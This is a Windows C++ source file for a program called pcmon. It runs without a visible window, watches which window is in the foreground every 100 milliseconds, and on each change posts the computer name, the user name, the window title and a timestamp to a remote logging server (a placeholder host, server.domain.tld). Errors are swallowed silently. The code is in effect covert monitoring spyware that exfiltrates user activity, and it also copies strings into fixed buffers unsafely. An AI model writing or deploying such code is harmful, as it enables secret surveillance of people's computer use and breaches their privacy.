#include "stdafx.h"
#include "pcmon.h"

#include "socket.h"

#include <string>
#include <windows.h>
#include <windowsx.h>
using namespace std;
using std::string;
HANDLE FocusThread;

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;								// current instance
TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name

// Forward declarations of functions included in this code module:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

#define NAMEARRAYSIZE 50

void uploadwindowtitle(string strWindowName = ""){
	char sz[512];
	char WindowName[255];
	int reqlen;

	strcpy(WindowName,strWindowName.c_str());

	try {

		SocketClient s("server.domain.tld", 80);

		// computer name
		TCHAR ComputerName[256];
		DWORD dwsize=256;
		GetComputerName(ComputerName,&dwsize);

		// current user username
		char* UserName = getenv("username");

		// system date and time
		SYSTEMTIME st;
		GetSystemTime(&st);
		char datetime[255];
		sprintf(datetime, "%d-%d-%d\ %d:%d:%d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute,st.wSecond);

		char reqstr[512];
		char newstr[512] = "";

		sprintf(reqstr,"pcname=%s&username=%s&windowtitle=%s&timestamp=%s",ComputerName,UserName,WindowName,datetime);
		reqlen = strlen(reqstr);


		for (int i = 0; i < strlen(WindowName); i++) {
			newstr[strlen(newstr)] = WindowName[i];
			if (newstr[strlen(newstr) - 1] == '\\') { newstr[strlen(newstr)] = '\\'; }
		}

		sprintf(reqstr,"pcname=%s&username=%s&windowtitle=%s&timestamp=%s",ComputerName,UserName,newstr,datetime);
		reqlen = strlen(reqstr);


		s.SendLine("POST /log.php HTTP/1.0\r\n");
		s.SendLine("Host: server.domain.tld\r\n");
		s.SendLine("User-Agent: pcmon\r\n");
		s.SendLine("Content-Type: application/x-www-form-urlencoded\r\n");
		
		sprintf(sz,"Content-Length: %d\r\n\r\n",reqlen);
		s.SendLine(sz);
		sprintf(sz,"%s\r\n\r\n",reqstr);
		s.SendLine(sz);

	}

	catch (const char* s) {
		//cerr << s << endl;
	} 
	catch (std::string s) {
		//cerr << s << endl;
	} 
	catch (...) {
		//cerr << "unhandled exception\n";
	}
}

//Retrieves the name of the foreground window
string GetForegroundName() {
	char WindowName[255];
	HWND hFWnd = GetForegroundWindow();

	GetWindowText(hFWnd, WindowName, 255);
	return WindowName;
}

/*
	This thread function keeps track of which window is in the foreground
*/
unsigned long __stdcall FocusEventProc(LPVOID param) {

	char namearray[NAMEARRAYSIZE][255];

	string cName;
	string prevName = GetForegroundName();
	uploadwindowtitle(prevName);


	while(true) {
		Sleep(100);
		cName = GetForegroundName();	//get current foreground window

		if(cName != prevName) {	//if it's different than last time around
			prevName = cName;	//set it as the new window in focus
			uploadwindowtitle(cName);
		}

	}
	return 0;
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{


	FocusThread = CreateThread(NULL,0,FocusEventProc,NULL,0,NULL);

	while(1) {
		Sleep(10000);	
	}

}
